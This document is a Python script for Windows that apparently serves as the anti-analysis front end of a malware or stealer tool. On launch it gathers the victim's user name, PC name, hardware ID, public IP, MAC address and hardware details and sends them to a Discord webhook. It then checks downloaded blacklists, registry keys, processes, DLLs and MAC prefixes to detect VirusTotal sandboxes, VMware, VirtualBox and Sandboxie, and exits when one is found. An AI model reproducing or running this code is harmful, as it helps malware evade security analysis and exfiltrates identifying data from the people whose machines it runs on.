import sys, os, re, ctypes, subprocess, requests
import uuid
import platform, wmi, psutil
from datetime import datetime
from urllib.request import Request, urlopen
import dhooks
from dhooks import Webhook
import time


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

ip = getip()

serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_platforms.txt')
api = "webhook here"

def vtdetect():
    webhooksend = Webhook(api)
    webhooksend.send(f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {computer.Win32_VideoController()[0].Name}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")

vtdetect()

try:
    if hwid in hwidlist.text:
        print('BLACKLISTED HWID DETECTED')
        print(f'HWID: {hwid}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if serveruser in pcusernamelist.text:
        print('BLACKLISTED PC USER DETECTED!')
        print(f'PC USER: {serveruser}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if pc_name in pcnamelist.text:
        print('BLACKLISTED PC NAME DETECTED!')
        print(f'PC NAME: {pc_name}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if ip in iplist.text:
        print('BLACKLISTED IP DETECTED!')
        print(f'IP: {ip}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if mac in maclist.text:
        print('BLACKLISTED MAC DETECTED!')
        print(f'MAC: {mac}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

gpu = computer.Win32_VideoController()[0].Name

try:
    if gpu in gpulist.text:        
        print('BLACKLISTED GPU DETECTED!')
        print(f'GPU: {gpu}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # if we are in a vm
        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
        sys.exit() # exit
    
    else:
        pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            print("VMware Registry Detected")
            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
            sys.exit()

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            sys.exit()
                        
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            sys.exit()
        except:
            pass              

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
            sys.exit()
    print("[*] Checking VM")
    registry_check()
    processes_and_files_check()
    mac_check()
    print("[+] VM Not Detected : )")    
                   
vmcheck() 
webhooksend = Webhook(api)
webhooksend.send("[+] VM Not Detected : )")
